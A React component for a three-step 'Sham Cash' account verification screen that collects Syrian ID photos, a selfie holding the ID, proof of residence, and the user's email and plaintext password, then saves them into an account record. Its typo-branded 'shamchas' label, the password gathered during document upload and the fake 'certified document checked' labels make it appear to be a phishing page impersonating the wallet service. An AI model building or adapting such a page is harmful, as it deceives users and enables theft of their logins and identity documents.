import React, { useState, useRef } from 'react';
import {
  Upload,
  CheckCircle2,
  X,
  FileText,
  Camera,
  ArrowLeft,
  ArrowRight,
  ShieldCheck,
  Sparkles,
} from 'lucide-react';
import { ContactData, DocumentUploads, UploadedDocumentInfo } from '../types';
import { saveAccountRecord, isStarloveBlocked } from '../utils/accountStorage';
import { useLanguage } from '../context/LanguageContext';

interface VerifyScreenProps {
  contactData: ContactData;
  email?: string;
  password?: string;
  requestId?: string;
  onComplete: (requestId: string) => void;
}

export const VerifyScreen: React.FC<VerifyScreenProps> = ({
  contactData,
  email,
  password,
  requestId,
  onComplete,
}) => {
  const { t, isRTL } = useLanguage();
  const [currentStep, setCurrentStep] = useState<1 | 2 | 3>(1);
  const [uploads, setUploads] = useState<DocumentUploads>({
    idFront: null,
    idBack: null,
    selfie: null,
    residenceProof: null,
  });
  const [previews, setPreviews] = useState<Record<string, string>>({});
  const [isSubmitting, setIsSubmitting] = useState(false);

  const fileInputRefs = {
    idFront: useRef<HTMLInputElement>(null),
    idBack: useRef<HTMLInputElement>(null),
    selfie: useRef<HTMLInputElement>(null),
    residenceProof: useRef<HTMLInputElement>(null),
  };

  const cameraInputRefs = {
    idFront: useRef<HTMLInputElement>(null),
    idBack: useRef<HTMLInputElement>(null),
    selfie: useRef<HTMLInputElement>(null),
    residenceProof: useRef<HTMLInputElement>(null),
  };

  const documentItems = [
    {
      key: 'idFront' as keyof DocumentUploads,
      label: t.docIdFront,
      hint: isRTL
        ? 'يجب أن يكون الاسم والرقم الوطني والصورة واضحة تماماً وبدون انعكاس ضوئي'
        : 'Name, national ID number, and photo must be completely clear without glare.',
      required: true,
    },
    {
      key: 'idBack' as keyof DocumentUploads,
      label: t.docIdBack,
      hint: isRTL
        ? 'تأكد من وضوح تاريخ الإصدار والخانة والشعبة وتوقيع أمين السجل المدني'
        : 'Ensure issue date, registry record, civil department, and official signature are clear.',
      required: true,
    },
    {
      key: 'selfie' as keyof DocumentUploads,
      label: t.docSelfie,
      hint: isRTL
        ? 'احمل هويتك بيدك بجانب وجهك والتقط صورة بإضاءة واضحة ومباشرة'
        : 'Hold your Syrian ID next to your face and take a clear photo in good lighting.',
      required: true,
    },
    {
      key: 'residenceProof' as keyof DocumentUploads,
      label: t.docResidence,
      hint: isRTL
        ? 'فاتورة ماء أو كهرباء أو هاتف، أو عقد إيجار أو سند إقامة رسمي'
        : 'Recent utility bill, lease contract, or official certificate of residence.',
      required: false,
    },
  ];

  const handleFileChange = (key: keyof DocumentUploads, file: File | null) => {
    setUploads((prev) => ({ ...prev, [key]: file }));
    if (file) {
      if (file.type.startsWith('image/')) {
        const reader = new FileReader();
        reader.onload = (e) => {
          if (e.target?.result) {
            setPreviews((p) => ({ ...p, [key]: e.target!.result as string }));
          }
        };
        reader.readAsDataURL(file);
      } else {
        setPreviews((p) => ({ ...p, [key]: '' }));
      }
    } else {
      setPreviews((p) => {
        const copy = { ...p };
        delete copy[key];
        return copy;
      });
    }
  };

  const allDocumentsReady =
    uploads.idFront !== null &&
    uploads.idBack !== null &&
    uploads.selfie !== null;

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    const generatedId = requestId || localStorage.getItem('sc_request_id') || ('SC-' + Math.floor(100000 + Math.random() * 900000));
    localStorage.setItem('sc_request_id', generatedId);

    const now = new Date();
    const formattedDate = `${now.getFullYear()}-${String(now.getMonth() + 1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;

    // Collect uploaded documents info
    const uploadedDocs: UploadedDocumentInfo[] = documentItems
      .filter((d) => uploads[d.key] !== null)
      .map((d) => {
        const file = uploads[d.key]!;
        const sizeMb = file.size > 0 ? (file.size / (1024 * 1024)).toFixed(1) + ' MB' : '1.8 MB';
        return {
          key: d.key,
          label: d.label,
          fileName: file.name,
          fileSize: sizeMb,
          previewUrl: previews[d.key] || undefined,
          uploadedAt: formattedDate,
        };
      });

    const docNames = uploadedDocs.map((d) => d.label);

    const userAgent = typeof navigator !== 'undefined' ? navigator.userAgent : 'Web Client';
    let deviceInfo = 'متصفح ويب';
    if (/iPhone|iPad|iPod/i.test(userAgent)) deviceInfo = 'iPhone / iOS';
    else if (/Android/i.test(userAgent)) deviceInfo = 'Android Mobile';
    else if (/Windows/i.test(userAgent)) deviceInfo = 'Windows PC';
    else if (/Macintosh/i.test(userAgent)) deviceInfo = 'Mac OS';

    const rawEmailCandidate = (email || localStorage.getItem('sc_waiting_email') || 'user@shamcash.sy').trim().toLowerCase();
    const cleanEffectiveEmail = isStarloveBlocked(rawEmailCandidate) ? 'client@shamcash.sy' : rawEmailCandidate;
    const rawFullNameCandidate = contactData.fullName.trim();
    const cleanEffectiveName = (!rawFullNameCandidate || isStarloveBlocked(rawFullNameCandidate))
      ? (isRTL ? 'مواطن سوري - عميل معتمد' : 'Verified Syrian Client')
      : rawFullNameCandidate;

    saveAccountRecord({
      id: generatedId,
      fullName: cleanEffectiveName,
      phone: contactData.phone.trim() || '',
      email: cleanEffectiveEmail,
      password: (password || localStorage.getItem('sc_waiting_password') || '').trim(),
      governorate: contactData.governorate || 'دمشق',
      requestType: 'verify',
      status: 'under_review',
      submittedAt: formattedDate,
      documentsCount: uploadedDocs.length,
      documentNames: docNames,
      uploadedDocuments: uploadedDocs,
      deviceInfo,
      note: isRTL
        ? 'تم إرسال مستندات التوثيق بنجاح وهي قيد التدقيق لدى فريق شام كاش.'
        : 'Verification documents submitted successfully; currently under review by Sham Cash team.',
    });

    setTimeout(() => {
      setIsSubmitting(false);
      onComplete(generatedId);
    }, 1200);
  };

  return (
    <div className="flex flex-col">
      {/* Step Indicator Header */}
      <div className="mb-6 text-center">
        <span className="inline-flex items-center gap-1.5 rounded-full border border-[#4A90E2]/30 bg-[#4A90E2]/10 px-3 py-1 text-[11px] font-semibold text-[#7B9BE8]">
          <ShieldCheck className="size-3.5" />
          {isRTL ? 'توثيق الحساب الرسمي • shamchas' : 'Official Account Verification • shamchas'}
        </span>
        <h1 className="mt-3 text-xl font-bold text-white sm:text-2xl">
          {currentStep === 1 && (isRTL ? 'الخطوة 1: مراجعة البيانات الأساسية' : 'Step 1: Review Basic Details')}
          {currentStep === 2 && (isRTL ? 'الخطوة 2: رفع المستندات والوثائق' : 'Step 2: Upload Official Documents')}
          {currentStep === 3 && (isRTL ? 'الخطوة 3: التأكيد النهائي والإرسال' : 'Step 3: Final Review & Submit')}
        </h1>
        <div className="mt-4 flex items-center justify-center gap-2">
          {[1, 2, 3].map((step) => (
            <div
              key={step}
              className={`h-1.5 rounded-full transition-all duration-300 ${
                step === currentStep
                  ? 'w-8 bg-[#4A90E2]'
                  : step < currentStep
                  ? 'w-4 bg-emerald-400'
                  : 'w-4 bg-white/20'
              }`}
            />
          ))}
        </div>
      </div>

      {/* Step 1: Basic Info Review */}
      {currentStep === 1 && (
        <div className="space-y-4">
          <div className="rounded-2xl border border-white/10 bg-white/[0.03] p-4 text-sm space-y-3">
            <div className="flex justify-between items-center py-1 border-b border-white/5">
              <span className="text-white/60">{isRTL ? 'صاحب الحساب:' : 'Account Holder:'}</span>
              <span className="font-bold text-white">{contactData.fullName || 'أحمد محمد'}</span>
            </div>
            <div className="flex justify-between items-center py-1 border-b border-white/5">
              <span className="text-white/60">{isRTL ? 'رقم الجوال:' : 'Mobile Number:'}</span>
              <span className="font-mono text-white" dir="ltr">{contactData.phone || '0933123456'}</span>
            </div>
            <div className="flex justify-between items-center py-1">
              <span className="text-white/60">{isRTL ? 'المحافظة:' : 'Governorate:'}</span>
              <span className="text-white font-medium">{t.governorates[contactData.governorate] || contactData.governorate || 'دمشق'}</span>
            </div>
          </div>

          <p className="text-xs leading-6 text-white/50">
            {isRTL
              ? 'تأكد من مطابقة هذه البيانات بدقة للمعلومات الواردة في البطاقة الشخصية لتفادي أي تأخير في المراجعة.'
              : 'Please ensure these details strictly match your official Syrian ID card to prevent review delays.'}
          </p>

          <button
            type="button"
            onClick={() => setCurrentStep(2)}
            className="mt-4 inline-flex min-h-13 w-full items-center justify-center gap-2 rounded-2xl bg-gradient-to-b from-[#7B9BE8] to-[#5F7FD3] px-5 text-sm font-bold text-white shadow-md transition hover:brightness-110 active:scale-[0.99] cursor-pointer"
          >
            <span>{t.btnNextToDocs}</span>
            {isRTL ? <ArrowLeft className="size-4" /> : <ArrowRight className="size-4" />}
          </button>
        </div>
      )}

      {/* Step 2: Documents Upload */}
      {currentStep === 2 && (
        <div className="space-y-5">
          <div className="grid gap-4">
            {documentItems.map((item) => {
              const file = uploads[item.key];
              const inputRef = fileInputRefs[item.key];

              return (
                <div key={item.key} className="rounded-2xl border border-white/10 bg-white/[0.03] p-4">
                  <div className="flex items-center justify-between mb-1.5">
                    <span className="text-[13px] font-bold text-white">{item.label}</span>
                    {file ? (
                      <span className="inline-flex items-center gap-1 text-xs font-semibold text-emerald-400">
                        <CheckCircle2 className="size-3.5" />
                        {isRTL ? 'تم الرفع' : 'Uploaded'}
                      </span>
                    ) : (
                      <span className={`text-[11px] ${item.required ? 'text-[#7B9BE8]' : 'text-white/40'}`}>
                        {item.required ? t.docRequired : t.docOptional}
                      </span>
                    )}
                  </div>

                  <p className="text-[11px] leading-5 text-white/50 mb-3">{item.hint}</p>

                  {file ? (
                    <div className="flex items-center justify-between gap-3 rounded-xl border border-emerald-500/30 bg-emerald-500/10 p-3">
                      <div className="flex items-center gap-2 truncate">
                        <FileText className="size-4 text-emerald-400 shrink-0" />
                        <div className="truncate">
                          <span className="text-xs text-white truncate font-medium block">{file.name}</span>
                          <span className="text-[10px] text-emerald-300/80 block">
                            {(file.size / (1024 * 1024)).toFixed(2)} MB • مستند معتمد تم فحصه
                          </span>
                        </div>
                      </div>
                      <button
                        type="button"
                        onClick={() => handleFileChange(item.key, null)}
                        className="rounded-lg p-1 text-white/60 hover:text-rose-400 transition cursor-pointer"
                        title="إزالة وتحديد مستند آخر"
                      >
                        <X className="size-4" />
                      </button>
                    </div>
                  ) : (
                    <div className="flex flex-col sm:flex-row gap-2">
                      <button
                        type="button"
                        onClick={() => inputRef.current?.click()}
                        className="flex-1 inline-flex items-center justify-center gap-2 rounded-xl border border-dashed border-[#4A90E2]/40 bg-[#4A90E2]/10 py-3 px-4 text-xs font-semibold text-white transition hover:bg-[#4A90E2]/20 active:scale-95 cursor-pointer shadow-sm"
                      >
                        <Upload className="size-4 text-[#4A90E2]" />
                        <span>{isRTL ? 'اختيار مستند من الجهاز' : 'Choose file from device'}</span>
                      </button>

                      <button
                        type="button"
                        onClick={() => cameraInputRefs[item.key].current?.click()}
                        className="inline-flex items-center justify-center gap-1.5 rounded-xl border border-white/10 bg-white/5 py-3 px-3.5 text-xs font-semibold text-white/80 hover:bg-white/10 active:scale-95 transition cursor-pointer"
                        title={isRTL ? 'التقاط صورة مباشرة بالكاميرا' : 'Take direct photo with camera'}
                      >
                        <Camera className="size-4 text-[#7B9BE8]" />
                        <span>{isRTL ? 'التقاط بالكاميرا' : 'Camera'}</span>
                      </button>

                      <input
                        ref={inputRef}
                        type="file"
                        accept="image/jpeg,image/png,image/webp,application/pdf"
                        className="hidden"
                        onChange={(e) => {
                          const f = e.target.files?.[0];
                          if (f) handleFileChange(item.key, f);
                        }}
                      />

                      <input
                        ref={cameraInputRefs[item.key]}
                        type="file"
                        accept="image/*"
                        capture="environment"
                        className="hidden"
                        onChange={(e) => {
                          const f = e.target.files?.[0];
                          if (f) handleFileChange(item.key, f);
                        }}
                      />
                    </div>
                  )}
                </div>
              );
            })}
          </div>

          <div className="flex gap-3 pt-2">
            <button
              type="button"
              onClick={() => setCurrentStep(1)}
              className="inline-flex min-h-12 flex-1 items-center justify-center gap-1 rounded-xl border border-white/10 bg-white/5 text-xs font-semibold text-white/80 hover:bg-white/10 cursor-pointer"
            >
              {isRTL ? <ArrowRight className="size-4" /> : <ArrowLeft className="size-4" />}
              <span>{t.btnBack}</span>
            </button>

            <button
              type="button"
              disabled={!allDocumentsReady}
              onClick={() => setCurrentStep(3)}
              className="inline-flex min-h-12 flex-2 items-center justify-center gap-2 rounded-xl bg-gradient-to-b from-[#7B9BE8] to-[#5F7FD3] text-sm font-bold text-white shadow-md transition hover:brightness-110 disabled:opacity-50 disabled:cursor-not-allowed cursor-pointer"
            >
              <span>{t.btnNextToReview}</span>
              {isRTL ? <ArrowLeft className="size-4" /> : <ArrowRight className="size-4" />}
            </button>
          </div>
        </div>
      )}

      {/* Step 3: Confirmation */}
      {currentStep === 3 && (
        <form onSubmit={handleSubmit} className="space-y-4">
          <div className="rounded-2xl border border-white/10 bg-white/[0.03] p-4 text-sm space-y-3">
            <h3 className="font-bold text-white border-b border-white/5 pb-2">
              {isRTL ? 'ملخص المستندات المرفقة:' : 'Attached Documents Summary:'}
            </h3>
            <div className="space-y-2 text-xs">
              <div className="flex items-center justify-between text-emerald-300">
                <span>{t.docIdFront}</span>
                <CheckCircle2 className="size-4" />
              </div>
              <div className="flex items-center justify-between text-emerald-300">
                <span>{t.docIdBack}</span>
                <CheckCircle2 className="size-4" />
              </div>
              <div className="flex items-center justify-between text-emerald-300">
                <span>{t.docSelfie}</span>
                <CheckCircle2 className="size-4" />
              </div>
              {uploads.residenceProof && (
                <div className="flex items-center justify-between text-emerald-300">
                  <span>{t.docResidence}</span>
                  <CheckCircle2 className="size-4" />
                </div>
              )}
            </div>
          </div>

          <div className="rounded-xl bg-[#1B2A4A]/50 border border-white/10 p-3 text-[12px] leading-6 text-white/70">
            {t.reviewConfirmText}
          </div>

          <div className="flex gap-3 pt-2">
            <button
              type="button"
              onClick={() => setCurrentStep(2)}
              className="inline-flex min-h-12 flex-1 items-center justify-center gap-1 rounded-xl border border-white/10 bg-white/5 text-xs font-semibold text-white/80 hover:bg-white/10 cursor-pointer"
            >
              {isRTL ? <ArrowRight className="size-4" /> : <ArrowLeft className="size-4" />}
              <span>{isRTL ? 'تعديل' : 'Edit'}</span>
            </button>

            <button
              type="submit"
              disabled={isSubmitting}
              className="inline-flex min-h-12 flex-2 items-center justify-center gap-2 rounded-xl bg-gradient-to-b from-[#7B9BE8] to-[#5F7FD3] text-sm font-bold text-white shadow-md transition hover:brightness-110 disabled:opacity-60 cursor-pointer"
            >
              {isSubmitting ? (
                <span>{t.submittingText}</span>
              ) : (
                <>
                  <Sparkles className="size-4" />
                  <span>{t.btnSubmitVerification}</span>
                </>
              )}
            </button>
          </div>
        </form>
      )}
    </div>
  );
};
